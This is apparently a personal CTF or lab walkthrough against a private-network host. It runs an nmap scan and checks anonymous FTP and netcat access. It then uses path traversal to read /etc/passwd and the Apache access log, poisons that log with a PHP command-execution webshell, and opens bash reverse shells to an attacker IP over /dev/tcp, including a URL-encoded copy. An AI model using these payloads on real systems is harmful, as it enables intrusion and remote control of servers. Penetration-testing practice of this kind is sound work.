```Bash
nmap -p- $IP -sV -sC --open
# -sV: Probe open ports to determine service/version info.
# -sC: Equivalent to --script=default, which runs a set of default scripts against the target.

ftp $IP 2121 
# 2121 port

For an FTP server that allows anonymous access, the credentials are typically:

Username: anonymous
Password: <any email address> (or sometimes just anonymous)

Most FTP servers that allow anonymous login will accept any string as the password. Commonly, users just enter their email address as a form of identification.
```

  

```Bash
ftp> quote PASV
227 Entering Passive Mode (192,168,209,72,14,178)
# Using passive mode is often necessary when the client is behind a firewall 
# that restricts incoming connections, as it allows the client to initiate both the command and data connections.
```

  

```Bash
nc -nv 192.168.209.72 3762
\#This command tells Netcat to connect (-nv stands for "no DNS resolution" and 
#"verbose") to the specified IP address and port.
\#It can use if ftp no resopence. 
```

since it have 3 port server, (80, 8593, 54787) so, no Nikto, for easy get blocked, too many request.

  

since we find  
  
`<a href="index.php?book=list">Book List</a>`

we try:

view-source:[http://192.168.197.72:8593/index.php?book=../../../../../etc/passwd](http://192.168.197.72:8593/index.php?book=../../../../../etc/passwd)

also in nmpa we find apache, so we try

[http://192.168.197.72:8593/index.php?book=../../../../../../var/www/html/index.php](http://192.168.197.72:8593/index.php?book=../../../../../../var/www/html/index.php)

[http://192.168.197.72:8593/index.php?book=../../../../../../var/log/apache2/access.log](http://192.168.197.72:8593/index.php?book=../../../../../../var/log/apache2/access.log)

  

```Bash
nc -nv 192.168.197.72 80
192.168.197.72 80 (http) open
GET /?<php system($_GET['cmd]); ?>
```

  

[http://192.168.197.72:8593/index.php?book=../../../../../../var/log/apache2/access.log&cmd=id](http://192.168.197.72:8593/index.php?book=../../../../../../var/log/apache2/access.log&cmd=id)

  

```Bash
bash -i >& /dev/tcp/192.168.45.227/9090 0>&1
# wrap the revershell 
bash -c 'bash -i >& /dev/tcp/192.168.45.164/9090 0>&1'
```

```Bash
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.192.72%2F9090%200%3E%261%27
```

  

user

miguel:x:1000:1000:,,,:/home/miguel:/bin/bash

  

  

view-source:[http://192.168.213.72:8593/index.php?book=../../../../var/log/apache2/access.log](http://192.168.213.72:8593/index.php?book=../../../../var/log/apache2/access.log)

  

[http://192.168.213.72:8593/index.php?book=../../../../var/log/apache2/access.log&cmd=id](http://192.168.213.72:8593/index.php?book=../../../../var/log/apache2/access.log&cmd=id)